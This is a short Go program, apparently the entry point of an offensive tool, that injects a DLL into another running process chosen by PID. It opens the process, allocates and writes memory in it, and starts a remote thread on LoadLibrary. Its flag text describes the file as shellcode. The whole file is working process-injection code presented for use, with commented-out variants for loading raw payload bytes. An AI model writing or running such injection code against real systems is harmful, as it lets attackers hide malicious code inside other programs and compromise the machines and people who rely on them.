package main

import (
	"flag"
	"fmt"
	"log"

	"github.com/r0lh/pinjector/pinjector"
)

func main() {
	var scFlag = flag.String("f", "", "absolute path to shellcode file to inject")
	var pidFlag = flag.Int("p", 0, "pid to inject")

	flag.Parse()

	if *scFlag == "" || *pidFlag < 1 {

		fmt.Printf("[!] -f: %v -p: %v", *scFlag, *pidFlag)
		fmt.Println("[!] ERROR : use -f and -p.")
	}

	//	payload, err := os.ReadFile(*scFlag)
	//	if err != nil {
	//		log.Fatal("[!] ERROR : Can't read dll.", err)
	//	}

	//	fmt.Printf("[-] Loaded Shellcode (%v bytes)\n", len(payload))

	inj := pinjector.Inject{
		DllPath: *scFlag,
		DLLSize: uint32(len(*scFlag)),
		//DLLBytes: uintptr(unsafe.Pointer(&dllBytes[0])),
		//DLLBytes: uintptr(unsafe.Pointer(&payload[0])),
		//DLLSize:  uint32(len(payload)),
		Pid: uint32(*pidFlag),
	}

	err := pinjector.OpenProcessHandle(&inj)
	if err != nil {
		log.Fatal(err)
	}

	err = pinjector.VirtualAllocEx(&inj)
	if err != nil {
		log.Fatal(err)
	}

	err = pinjector.WriteProcessMemory(&inj)
	if err != nil {
		log.Fatal(err)
	}

	err = pinjector.GetLoadLibAddress(&inj)
	if err != nil {
		log.Fatal(err)
	}

	err = pinjector.CreateRemoteThread(&inj)
	if err != nil {
		log.Fatal(err)
	}

	err = pinjector.WaitForSingleObject(&inj)
	if err != nil {
		log.Fatal(err)
	}

	err = pinjector.VirtualFreeEx(&inj)
	if err != nil {
		log.Fatal(err)
	}

}
